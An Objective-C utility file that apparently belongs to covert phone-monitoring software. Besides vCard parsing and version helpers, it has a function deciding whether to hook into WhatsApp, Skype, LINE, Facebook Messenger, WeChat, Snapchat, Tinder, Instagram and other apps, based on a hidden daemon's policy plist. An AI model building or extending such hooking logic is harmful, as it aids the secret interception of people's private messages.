//
//  IMShareUtils.m
//  MSFSP
//
//  Created by Benjawan Tanarattanakorn on 6/19/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <AVFoundation/AVFoundation.h>

#import "IMShareUtils.h"

#import "ABVCardRecord.h"
#import "ABVCardExporter.h"
#import <AddressBook/ABRecord.h>
#import <AddressBook/ABPerson.h>
#import <AddressBook/ABMultiValue.h>
#import <MobileCoreServices/MobileCoreServices.h>
#import "DaemonPrivateHome.h"
#import "FxIMEvent.h"


@interface IMShareUtils (private)
+ (NSInteger) compareVersionCompoents: (NSArray *) aComparedComponents
					anotherComponents: (NSArray *) aAnotherComponents;
@end


@implementation IMShareUtils

/*
+ (NSString *) getVCardStringFromData: (NSData *) aVCardData {	
	NSString *vCardString = nil;
	
	if (aVCardData) {
		NSUInteger twoBytesMaxValue				= 65535;

		DLog (@"Original vCard data %@",				aVCardData)
		DLog (@"Original vCard length %d",		[aVCardData length])
			
		//[aVCardData writeToFile:@"/tmp/originalVCard.vcf" atomically:YES];
		
		// -- remove photo if the size of vcard cannot be stored in 2 bytes
		if ([aVCardData length] > (twoBytesMaxValue)) {			
			DLog (@"-- Big VCard, so remove photo from VCard")
			ABVCardRecord *abVCardRecord	= [[ABVCardRecord alloc] initWithVCardRepresentation:aVCardData];				
			ABRecordRef abRecord			= (ABRecordRef)[abVCardRecord record];		
			CFErrorRef anError				= NULL;
			ABPersonRemoveImageData(abRecord, &anError);																					// remove photo
			
			// -- Note that when using the API _vCard21RepresentationOfRecords to get the VCard data, it lost the image.
			aVCardData						= [ABVCardExporter _vCard30RepresentationOfRecords:[NSArray arrayWithObject:(id)abRecord]];		// assign the final VCARD data
			//[aVCardData writeToFile:@"/tmp/newVCard.vcf" atomically:YES];						
			DLog (@"New vCard %@", aVCardData)
			
			[abVCardRecord release];
		} else {		
			DLog (@"-- Small VCard, so NOT remove the photo")
		}
		
		vCardString	=  [[NSString alloc] initWithData:aVCardData encoding:NSUTF8StringEncoding];	

		//[aIMEvent setMRepresentationOfMessage:kIMMessageContact];
		//[aIMEvent setMMessage:vCardString];		
	}
	DLog (@"final vcard string %@", vCardString)
	
	return [vCardString autorelease];	
}
*/

+ (NSString *) getVCardStringFromData: (NSData *) aVCardData {	
	NSString *vCardString = nil;
	
	if (aVCardData) {
		DLog (@"Original vCard data length = %lu", (unsigned long)[aVCardData length])
		ABVCardRecord *abVCardRecord	= [[ABVCardRecord alloc] initWithVCardRepresentation:aVCardData];				
		ABRecordRef abRecord			= (ABRecordRef)[abVCardRecord record];		
	
		CFStringRef firstname			= NULL;		
		CFStringRef middlename			= NULL;		
		CFStringRef lastname			= NULL;		
		firstname						= ABRecordCopyValue(abRecord, kABPersonFirstNameProperty);
		middlename						= ABRecordCopyValue(abRecord, kABPersonMiddleNameProperty);
		lastname						= ABRecordCopyValue(abRecord, kABPersonLastNameProperty);
		DLog (@">>> firstname %@", firstname)		
		DLog (@">>> middlename %@", middlename)
		DLog (@">>> lastname %@", lastname)
	
		NSString *fullname = @"";
		
		/*************************************************************************
		 NOTE that CFRelease(NULL) halts the application 
		 Reference: http://www.opensource.apple.com/source/CF/CF-550/CFRuntime.c
		 *************************************************************************/		
		
		/*
		 Fullname can be either one of these in order
			- CASE 1: The concatination of firstname, middle, and lastname
			- CASE 2: Nickname
			- CASE 3: Organization name
		 */
		
		// construct string with [firstname] [middlename] [lastname]		
		if (firstname) {				
			DLog (@"!!! first name exist")
			fullname	= [NSString stringWithFormat:@"%@", firstname];
			CFRelease(firstname);	
		}
		if (middlename) {
			DLog (@"!!! middle name exist")
			if ([fullname length] == 0)
				fullname	= [NSString stringWithFormat:@"%@", middlename];
			else
				fullname	= [NSString stringWithFormat:@"%@ %@", fullname, middlename];
			CFRelease(middlename);
		}
		if (lastname) {
			DLog (@"!!! last name exist")
			if ([fullname length] == 0)
				fullname	= [NSString stringWithFormat:@"%@", lastname];
			else				
				fullname	= [NSString stringWithFormat:@"%@ %@", fullname, lastname];
			CFRelease(lastname);
		}
		
		// use 'nickname' if the above-mention names are not available		
		if ([fullname length] == 0) {					
			CFStringRef abNickname		= NULL;
			abNickname					= ABRecordCopyValue(abRecord, kABPersonNicknameProperty);
			DLog (@">>> nickname %@", abNickname)
			if (abNickname) {
				DLog (@"!!! nickname exist")
				fullname	= [NSString stringWithFormat:@"%@", abNickname];			
				CFRelease(abNickname);				
			}													
		}			

		// use 'organization' name if the above-mention names are not available
		if ([fullname length] == 0) {
			CFStringRef orgname			= NULL;
			orgname						= ABRecordCopyValue(abRecord, kABPersonOrganizationProperty);
			DLog (@">>> orgname %@", orgname)
			if (orgname) {
				DLog (@"!!! orgname exist")
				fullname	= [NSString stringWithFormat:@"%@", orgname];			
				CFRelease(orgname);				
			}			
		}								

		if ([fullname length] == 0) {
			// email
			ABMultiValueRef emails	= ABRecordCopyValue(abRecord, kABPersonEmailProperty);
			if (emails) {
				DLog (@"!!! email exist")
				NSInteger count = ABMultiValueGetCount(emails);
				if (count) {
					CFStringRef emailRef	= ABMultiValueCopyValueAtIndex(emails, 0);
					fullname				= [NSString stringWithFormat:@"%@", emailRef];
					CFRelease(emailRef);
					CFRelease(emails);
				}
			}		
		}
		
		if ([fullname length] == 0) {
			// email
			ABMultiValueRef phones	= ABRecordCopyValue(abRecord, kABPersonPhoneProperty);
			if (phones) {
				DLog (@"!!! phone exist")
				NSInteger count = ABMultiValueGetCount(phones);
				if (count) {
					CFStringRef phoneRef	= ABMultiValueCopyValueAtIndex(phones, 0);
					fullname				= [NSString stringWithFormat:@"%@", phoneRef];
					CFRelease(phoneRef);
					CFRelease(phones);
				}
			}
		}
		
		DLog (@"*********** fullname %@", fullname)
					
		vCardString	=  [[NSString alloc] initWithFormat:@"Name: %@", fullname];										
		[abVCardRecord release];
	}
	
	DLog (@"final vcard string %@", vCardString)
	
	return [vCardString autorelease];	
}

+ (NSString *) getVCardStringFromDataV2: (NSData *) aVCardData {
    NSString *vCardBegin        = @"BEGIN:VCARD";
    NSString *vCardEnd          = @"END:VCARD";

    NSString *vCardString       = [[NSString alloc] initWithData:aVCardData encoding:NSUTF8StringEncoding];

    NSArray *elements           = [vCardString componentsSeparatedByString:vCardBegin];
    NSString *firstVcard        = nil;

    if ([elements count] > 2) {
        // get only first vcard structure
        NSRange firstEndRange   = [vCardString rangeOfString:vCardEnd];
        if (firstEndRange.length != 0) {
            NSInteger toIndex       = firstEndRange.location + firstEndRange.length;
            firstVcard              = [vCardString substringToIndex:toIndex];
            DLog(@"first vCard %@", firstVcard)
            aVCardData              = [firstVcard dataUsingEncoding:NSUTF8StringEncoding];
        }
    }
    
    return [self getVCardStringFromData:aVCardData];
}

/*
 input:		fullpath the the file
 output:	mime type string
 */
+ (NSString *) mimeType: (NSString*) aFullPath {
	DLog (@"aFullPath = %@", aFullPath); // If the path is nil there will be crash with (Trace/BPT trap: 5)
	
	NSString *mime = @"";
	if ([aFullPath length] > 0) {
		DLog (@"--> extension %@", [aFullPath pathExtension])
		CFStringRef uti			= UTTypeCreatePreferredIdentifierForTag(kUTTagClassFilenameExtension, (CFStringRef)[aFullPath pathExtension], NULL);
		CFStringRef mimeType	= UTTypeCopyPreferredTagWithClass(uti, kUTTagClassMIMEType);
		CFRelease(uti);
		
		mime = (NSString *)mimeType;
		mime = [mime autorelease];
		
		//		if (!mime) {
		//			if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:@"caf"])
		//				mime = @"audio/x-caf";
		//			else if ([[[aFullPath pathExtension] lowercaseString] isEqualToString:@"3ga"])
		//				mime = @"audio/3gpp";		
		//			DLog (@"Manually assign mime type: %@", mime)
		//		}
		DLog(@"MIME type of the media, mime = %@", mime);
	}
	return (mime);
}


+ (NSArray *) parseVersion: (NSString *) aVersion {
	
	NSArray *versionComponents	= [aVersion componentsSeparatedByString:@"."];
	DLog (@"versionComponents %@", versionComponents)
	NSString *majorString		= nil;
	NSString *minorString		= nil;
	NSString *buildString		= nil;
	
	if ([versionComponents count] > 0)
		majorString		= [versionComponents objectAtIndex:0];	// major
	//DLog (@"majorString %@", majorString)
	
	if ([versionComponents count] > 1)
		minorString		= [versionComponents objectAtIndex:1];	// minor	
	//DLog (@"minorString %@", minorString)	
	
	if ([versionComponents count] > 2)
		buildString		= [versionComponents objectAtIndex:2];	// build
	
	//DLog (@"major/minor/build %@/%@/%@", majorString, minorString, buildString)
	// major and minor are required; build is optional
	if (majorString		&&	minorString) {
		// -- get absolute value of major version
		NSNumberFormatter *numberFormat = [[[NSNumberFormatter alloc] init] autorelease];
		NSNumber *majorNumber			= [numberFormat numberFromString:majorString];
		if ([majorNumber intValue] < 0) { // Testing build
			majorNumber			= [NSNumber numberWithInt:abs([majorNumber intValue])];
		}	
		NSNumber *minorNumber	= [numberFormat numberFromString:minorString];
		
		// -- optional for build version
		NSNumber *buildNumber	=  nil;
		if (buildString)
			buildNumber			= [numberFormat numberFromString:buildString];		
		
		if (buildNumber) {
			versionComponents	= [NSArray arrayWithObjects:majorNumber, minorNumber, buildNumber, nil];		
		} else
			versionComponents	= [NSArray arrayWithObjects:majorNumber, minorNumber, nil];				
	} else {
		versionComponents		= [NSArray array];
	}
	DLog (@"version to be processed %@", versionComponents)
	return (versionComponents);
}
/*
 
 RetVal		1: aVersion1	>	aVersion2
			0: aVersion1	=	aVersion2
			-1: aVersion1	<	aVersion2
 */
+ (NSInteger) compareVersion: (NSString *) aVersion1
				 withVersion: (NSString *) aVersion2 {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSArray *version1Components	= [aVersion1 componentsSeparatedByString:@"."];
	NSArray *version2Components	= [aVersion2 componentsSeparatedByString:@"."];
	/*
	DLog (@"---------------------- VERSION1 --------------------")
	DLog (@"version1Components	= %@", version1Components)
	DLog (@"version2Components	= %@", version2Components)
	DLog (@"---------------------- VERSION1 --------------------")
	*/
	// Make sure both array have the same elements
	NSInteger numberOfComponentNeed = [version1Components count] - [version2Components count];
	if (numberOfComponentNeed > 0) { // Number of elements in component 1 more than 2, thus add more elements to 2
		NSMutableArray *components = [NSMutableArray arrayWithArray:version2Components];
		for (NSInteger i = 0; i < numberOfComponentNeed; i++) {
			[components addObject:@"0"];
		}
		version2Components = [NSArray arrayWithArray:components];
	} else if (numberOfComponentNeed < 0) { // Number of elements in component 1 less than 2 , thus add more elements to 1
		NSMutableArray *components = [NSMutableArray arrayWithArray:version1Components];
		for (int i = 0; i < abs(numberOfComponentNeed); i++) {
			[components addObject:@"0"];
		}
		version1Components = [NSArray arrayWithArray:components];
	}
	/*
	DLog (@"---------------------- VERSION2 --------------------")
	DLog (@"version1Components	= %@", version1Components)
	DLog (@"version2Components	= %@", version2Components)
	DLog (@"---------------------- VERSION2 --------------------")
	*/
	NSInteger result = 0;
	for (NSInteger i = 0; i < [version1Components count]; i++) { // Iterate either array is the same
		NSString *component1 = [version1Components objectAtIndex:i];
		NSString *component2 = [version2Components objectAtIndex:i];
		NSInteger version1 = abs([component1 intValue]);
		NSInteger version2 = abs([component2 intValue]);
		if (version1 == version2) {
			result = 0;
		} else if (version1 > version2) {
			result = 1;
			break;
		} else if (version1 < version2) {
			result = -1;
			break;
		}
	}
	DLog (@"Result from the version comparison = %d", (int)result)
	[pool release];
	return (result);
}

/*
 * Compare if the first version is greater than or equal the second version or not
 * return - TRUE:	The first version GREATER than or EQUAL to the second version
 *			FALSE:	The first version is lower than the second version
 */
+ (BOOL) isVersion: (NSArray *) aFirstVersion 
	greaterOrEqual: (NSArray *) aSecondVersion {
	BOOL isGreaterOrEqual	= NO;	
	NSInteger result		=  [IMShareUtils compareVersionCompoents:aFirstVersion anotherComponents:aSecondVersion];
	if (result == 1		||	result == 0) 
		isGreaterOrEqual	= YES;
	return isGreaterOrEqual;
}

+ (BOOL) isVersion: (NSArray *) aFirstVersion
             equal: (NSArray *) aSecondVersion {
	BOOL isEqual            = NO;
	NSInteger result		=  [IMShareUtils compareVersionCompoents:aFirstVersion anotherComponents:aSecondVersion];
	if (result == 0)
		isEqual	= YES;
	return isEqual;
}

+ (BOOL) isCurrentVersionGreaterOrEqual: (NSString *) aOtherVersionString {
    // - Get current version string
    NSBundle *bundle			= [NSBundle mainBundle];
    NSDictionary *bundleInfo	= [bundle infoDictionary];
    NSString *releaseVersion	= [bundleInfo objectForKey:@"CFBundleShortVersionString"];
    if (releaseVersion == nil || [releaseVersion length] == 0) {
        releaseVersion          = [bundleInfo objectForKey:@"CFBundleVersion"];
    }
    
    // - Get current version array
    NSArray *versionArray	= [IMShareUtils parseVersion:releaseVersion];
    BOOL isGreaterOrEqual	= NO;
    isGreaterOrEqual        = [IMShareUtils isVersion:versionArray
                                       greaterOrEqual:[IMShareUtils parseVersion:aOtherVersionString]];
    return isGreaterOrEqual;
}


+ (BOOL) isCurrentVersionEqual: (NSString *) aOtherVersionString {
    // - Get current version string
    NSBundle *bundle			= [NSBundle mainBundle];
    NSDictionary *bundleInfo	= [bundle infoDictionary];
    NSString *releaseVersion	= [bundleInfo objectForKey:@"CFBundleShortVersionString"];
    if (releaseVersion == nil || [releaseVersion length] == 0) {
        releaseVersion          = [bundleInfo objectForKey:@"CFBundleVersion"];
    }
    
    // - Get current version array
    NSArray *versionArray       = [IMShareUtils parseVersion:releaseVersion];
    BOOL isEqual                = NO;
    isEqual                     = [IMShareUtils isVersion:versionArray
                                                equal:[IMShareUtils parseVersion:aOtherVersionString]];
    return isEqual;
}

+ (BOOL) isCurrentVersionLessThan: (NSString *) aOtherVersionString {
    // - Get current version string
    NSBundle *bundle			= [NSBundle mainBundle];
    NSDictionary *bundleInfo	= [bundle infoDictionary];
    NSString *releaseVersion	= [bundleInfo objectForKey:@"CFBundleShortVersionString"];
    if (releaseVersion == nil || [releaseVersion length] == 0) {
        releaseVersion          = [bundleInfo objectForKey:@"CFBundleVersion"];
    }
    
    // - Get current version array
    NSArray *versionArray	= [IMShareUtils parseVersion:releaseVersion];
    BOOL isGreaterOrEqual	= NO;
    isGreaterOrEqual        = [IMShareUtils isVersion:versionArray
                                            lowerThan:[IMShareUtils parseVersion:aOtherVersionString]];
    return isGreaterOrEqual;
}


/*
 * Compare if the first version is lower than the second version or not
 * return - TRUE:	The first version is LOWER than the second version
 *			FALSE:	The first version is NOT LOWER than the second version
 */
+ (BOOL) isVersion: (NSArray *) aFirstVersion 
		 lowerThan: (NSArray *) aSecondVersion {
	BOOL isLower			= NO;	
	NSInteger result		=  [IMShareUtils compareVersionCompoents:aFirstVersion anotherComponents:aSecondVersion];
	if (result == -1) 
		isLower				= YES;
	return isLower;
}

+ (BOOL) isVersionText: (NSString *) aFirstVersion isHigherThan: (NSString *) aSecondVersion {
    return ([self compareVersion:aFirstVersion withVersion:aSecondVersion] == 1);
}

+ (BOOL) isVersionText: (NSString *) aFirstVersion isLessThan: (NSString *) aSecondVersion {
    return ([self compareVersion:aFirstVersion withVersion:aSecondVersion] == -1);
}

+ (BOOL) isVersionText: (NSString *) aFirstVersion isLessThanOrEqual: (NSString *) aSecondVersion {
	return (([self compareVersion:aFirstVersion withVersion:aSecondVersion] == -1)    ||
            ([self compareVersion:aFirstVersion withVersion:aSecondVersion] == 0));
}

+ (BOOL) isVersionText: (NSString *) aFirstVersion isHigherThanOrEqual: (NSString *) aSecondVersion {
	return (([self compareVersion:aFirstVersion withVersion:aSecondVersion] == 1)    ||
            ([self compareVersion:aFirstVersion withVersion:aSecondVersion] == 0));
}

/*
 
 RetVal		1: aComparedComponents	>	aAnotherComponents
			0: aComparedComponents	=	aAnotherComponents
		   -1: aComparedComponents	<	aAnotherComponents
 */
+ (NSInteger) compareVersionCompoents: (NSArray *) aComparedComponents
					anotherComponents: (NSArray *) aAnotherComponents {
	
	NSInteger isComparedVersionNewer = 0;
	
	// -- compared component	
	NSInteger majorVersion = 0;
	NSInteger minorVersion = 0;
    
    if ([aComparedComponents count] >= 1) {
		majorVersion		= [[aComparedComponents objectAtIndex:0] intValue];
	}

	if ([aComparedComponents count] >= 2) {
		minorVersion		= [[aComparedComponents objectAtIndex:1] intValue];	
	}
	
	// -- another version
	NSInteger majorAnotherVersion = 0;
	NSInteger minorAnotherVersion = 0;
    
	if ([aAnotherComponents count] >= 1) {
		majorAnotherVersion = [[aAnotherComponents objectAtIndex:0] intValue];
	}
	if ([aAnotherComponents count] >= 2) {
		minorAnotherVersion	= [[aAnotherComponents objectAtIndex:1] intValue];	
	}
	
	// -- STEP 1: Compare MAJOR	--
	
	// CASE: newer major
	if (majorVersion > majorAnotherVersion) {
		isComparedVersionNewer = 1;										// >>>>>>>>>>>>>> NEWER (major)
	}
	// CASE: equal major
	else if (majorVersion == majorAnotherVersion) {	
		
		// -- STEP 2: Compare MINOR	--
		if (minorVersion > minorAnotherVersion) {
			isComparedVersionNewer					= 1;					// >>>>>>>>>>>>>> NEWER (minor)
		} else if (minorVersion == minorAnotherVersion) {
			
			// -- STEP 3: Compare BUILD --
			NSInteger buildVersion					= 0;
			NSInteger buildAnotherVersion			= 0;										
			
			if ([aComparedComponents count] >= 3) 
				buildVersion						= [[aComparedComponents objectAtIndex:2] intValue];
			if ([aAnotherComponents count] >= 3)
				buildAnotherVersion					= [[aAnotherComponents objectAtIndex:2] intValue];
			
			if (buildVersion > buildAnotherVersion)			
				isComparedVersionNewer = 1;										// >>>>>>>>>>>>>> NEWER (build)
			else if (buildVersion == buildAnotherVersion)
				isComparedVersionNewer = 0;										// >>>>>>>>>>>>>> EQUAL (build)
			else
				isComparedVersionNewer = -1;									// >>>>>>>>>>>>>> LESS (build)
			
		} else {
			isComparedVersionNewer = -1;								// >>>>>>>>>>>>>> LESS (minor)
		}
		
	} 
	// CASE: less major
	else {
		isComparedVersionNewer = -1;								// >>>>>>>>>>>>>> LESS (major)
	}
	
	DLog (@">> isComparedVersionNewer %d", (int)isComparedVersionNewer)
	return isComparedVersionNewer;
}

+ (BOOL) shouldHookInCurrentVersion: (NSString *) aCurrentVersion
			   withBundleIdentifier: (NSString *) aBundleIdentifier {
	//return true;
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	BOOL shouldHook= false;
	DLog(@"shouldHookInCurrentVersion aCurrentVersion = %@, aBundleIdentifier = %@",aCurrentVersion,aBundleIdentifier);

	// Find  imClientID
	NSString *imClientID = nil;
	if([aBundleIdentifier isEqualToString:@"com.blackberry.bbm1"]){
		imClientID = @"1";
	}else if([aBundleIdentifier isEqualToString:@"net.whatsapp.WhatsApp"]){
		imClientID = @"2";
	}else if([aBundleIdentifier isEqualToString:@"com.skype.skype"] ){
		imClientID = @"5";
	}else if([aBundleIdentifier isEqualToString:@"com.skype.SkypeForiPad"]){
		imClientID = @"6";
	}else if([aBundleIdentifier isEqualToString:@"jp.naver.line"] ){
		imClientID = @"8";
	}else if([aBundleIdentifier isEqualToString:@"com.facebook.Facebook"]){
		imClientID = @"9";
	}else if([aBundleIdentifier isEqualToString:@"com.facebook.Messenger"]){
		imClientID = @"10";
	}else if([aBundleIdentifier isEqualToString:@"com.viber"] ){
		imClientID = @"18";
	}else if([aBundleIdentifier isEqualToString:@"com.tencent.xin"] ){
		imClientID = @"21";
	}else if([aBundleIdentifier isEqualToString:@"com.toyopagroup.picaboo"] ){
		imClientID = @"33";
	}else if([aBundleIdentifier isEqualToString:@"com.google.hangouts"] ){
		imClientID = @"34";
	}else if([aBundleIdentifier isEqualToString:@"com.yahoo.messenger"] ){
		imClientID = @"4";
	} else if ([aBundleIdentifier isEqualToString:@"com.facebook.Slingshot"]) {
        imClientID = @"35";
    } else if ([aBundleIdentifier isEqualToString:@"com.linecorp.line.ipad"]) {
        imClientID = @"36";
    } else if ([aBundleIdentifier isEqualToString:@"com.yahoo.iris"]) {
        imClientID = @"40";
    } else if ([aBundleIdentifier isEqualToString:@"com.cardify.tinder"]) {
        imClientID = @"39";
    } else if ([aBundleIdentifier isEqualToString:@"com.burbn.instagram"]) {
        imClientID = @"41";
    }
	
	// Find  Compare ID
	if(imClientID != nil && aCurrentVersion != nil){
		DLog(@"shouldHookInCurrentVersion imClientID = %@",imClientID);
		NSString *originalPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"etc/"];
		NSString *actualPath = nil; 
	
		NSFileManager * file =[NSFileManager defaultManager];
		DLog(@"file %@",[NSString stringWithFormat:@"%@%@.plist",originalPath,imClientID]);
		if([file fileExistsAtPath:[NSString stringWithFormat:@"%@%@.plist",originalPath,imClientID]]){
		
			actualPath = [NSString stringWithFormat:@"%@%@.plist",originalPath,imClientID];
			DLog(@"shouldHookInCurrentVersion actualPath = %@",actualPath);
			
			NSDictionary * listOfIMControl = [[NSDictionary alloc]initWithContentsOfFile:actualPath];
			//NSString *plistIMServiceID = [listOfIMControl objectForKey:@"imclientid"];
			NSString *plistLastVersion = [listOfIMControl objectForKey:@"latestversion"];
			NSMutableArray *plistExceptionVersion =  [listOfIMControl objectForKey:@"exceptionversions"];
			NSString *plistPolicy =  [listOfIMControl objectForKey:@"policy"];

//			DLog(@"shouldHookInCurrentVersion listOfIMControl = %@",listOfIMControl);
//			DLog(@"shouldHookInCurrentVersion plistLastVersion = %@",plistLastVersion);
//			DLog(@"shouldHookInCurrentVersion plistExceptionVersion = %@",plistExceptionVersion);
//			DLog(@"shouldHookInCurrentVersion plistPolicy = %@",plistPolicy);
		
			// Check exception version first
			for(int i=0;i<[plistExceptionVersion count];i++){
				NSString * element = [plistExceptionVersion objectAtIndex:i];
				if([self compareVersion:aCurrentVersion withVersion:element] == 0){
					DLog(@"Exception version");
					[listOfIMControl release];
					[pool release];
					return NO;
				}
			}
			
			// Check Current Version <= Latest Version
			if([self compareVersion:aCurrentVersion withVersion:plistLastVersion] == 0 ||
			   [self compareVersion:aCurrentVersion withVersion:plistLastVersion] == -1){
				DLog(@"accepted version");
				shouldHook= YES;
			}else{
				// Check Policy 
				if([plistPolicy intValue] == 1){
					DLog(@"Not accepted version but allow by Policy");
					shouldHook= YES;
				}else {
					DLog(@"Not accepted version and not allow by Policy");
					shouldHook= NO;
				}
			}
			[listOfIMControl release];
		}else{
			DLog(@"No plist found ==> required to hook");
			//shouldHook= NO;
            shouldHook=YES;
		}
	}else{
		DLog(@"Not support imClientID found or cannot get application version");
		shouldHook= NO;
	}
	[pool release];
	return shouldHook;
}

+ (BOOL) isVideo: (NSString*) aFullPath {
	BOOL isVideo = NO;
	if ([[[UIDevice currentDevice] systemVersion] intValue] >= 5) {
		NSURL *mediaURL			= [NSURL fileURLWithPath:aFullPath];
		
		NSAutoreleasePool *pool	= [[NSAutoreleasePool alloc] init];
		AVAsset *asset			= [AVAsset assetWithURL:mediaURL];
        DLog(@"Asset Track %@", [asset tracks])
        //DLog(@"Asset commonMetadata %@", [asset commonMetadata])
        //DLog(@"Asset availableMetadataFormats %@", [asset availableMetadataFormats])
        //DLog(@"Asset isPlayable %d", [asset isPlayable])
        //DLog(@"Asset isReadable %d", [asset isReadable])

        /************************************************************
        If the path is the valid video, the log will contains:
         
         
         Asset Track (
            "<AVAssetTrack: 0x15e98600, trackID = 1, mediaType = soun>",
            "<AVAssetTrack: 0x15e29e60, trackID = 2, mediaType = vide>"
         )
         Asset commonMetadata (
            "<AVMutableMetadataItem: 0x15ede360, keySpace=mdta, key=com.apple.quicktime.creationdate, commonKey=creationDate, locale=en_US, value=2014-07-28T11:50:39+0700, time={INVALID}, duration={INVALID}, extras={\n    dataType = 1;\n}>",
            "<AVMutableMetadataItem: 0x15e26d70, keySpace=mdta, key=com.apple.quicktime.make, commonKey=make, locale=en_US, value=Apple, time={INVALID}, duration={INVALID}, extras={\n    dataType = 1;\n}>",
            "<AVMutableMetadataItem: 0x15e22e80, keySpace=mdta, key=com.apple.quicktime.model, commonKey=model, locale=en_US, value=iPhone 4, time={INVALID}, duration={INVALID}, extras={\n    dataType = 1;\n}>",
            "<AVMutableMetadataItem: 0x15e22250, keySpace=mdta, key=com.apple.quicktime.software, commonKey=software, locale=en_US, value=7.0.4, time={INVALID}, duration={INVALID}, extras={\n    dataType = 1;\n}>"
         )
         Asset availableMetadataFormats (
            "com.apple.quicktime.mdta",
            "com.apple.quicktime.udta"
         )
         Asset isPlayable 1
         Asset isReadable 1
         ************************************************************/
		for (AVAssetTrack *track in [asset tracks]) {
			if ([[track mediaType] isEqualToString:AVMediaTypeVideo])
				isVideo = YES;
		}
		[pool drain];
	}
	return isVideo;
}

+ (BOOL) isImageMimetype: (NSString *) aMediaName {
    NSString * mimetype     = [IMShareUtils mimeType:aMediaName];
    BOOL isMedia = NO;
    if ([mimetype hasPrefix:@"image"]) {
        isMedia = YES;
    }
    return isMedia;
}

+ (BOOL) isVideoMimetype: (NSString *) aMediaName {
    NSString * mimetype     = [IMShareUtils mimeType:aMediaName];
    BOOL isMedia = NO;
    if ([mimetype hasPrefix:@"video"]) {
        isMedia = YES;
    }
    return isMedia;
}

+ (NSString *) saveData: (NSData *) aData toDocumentSubDirectory: (NSString *) aSubDirectory fileName: (NSString *) aFileName {
    NSError *error = nil;
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0]; // Get documents folder
    NSString *dataPath = [documentsDirectory stringByAppendingPathComponent:aSubDirectory];
    
    if (![[NSFileManager defaultManager] fileExistsAtPath:dataPath]) {
        [[NSFileManager defaultManager] createDirectoryAtPath:dataPath withIntermediateDirectories:YES attributes:nil error:&error]; // Create folder
    }
    
    dataPath = [dataPath stringByAppendingPathComponent:aFileName];
    BOOL saveData = [aData writeToFile:dataPath atomically:YES];
    if (saveData) {
        return (dataPath);
    } else {
        return nil;
    }
}

@end
